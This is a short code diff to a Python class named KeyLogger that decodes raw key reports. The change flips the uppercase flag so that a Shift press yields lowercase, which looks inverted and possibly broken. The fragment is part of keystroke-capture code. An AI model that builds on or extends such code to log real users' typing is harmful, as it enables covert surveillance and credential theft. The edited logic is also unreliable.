@@ -57,9 +57,9 @@ class KeyLogger:
                 exit()
             if data:
                 key_code = data[2]  # The key code is in byte
-                uppercase: bool = False
+                uppercase: bool = True
                 if data[0] == 2:
-                    uppercase = True
+                    uppercase = False
                 try:
                     # release the key:
                     if self.keyboard_layout[str(key_code)] == [None, None]:
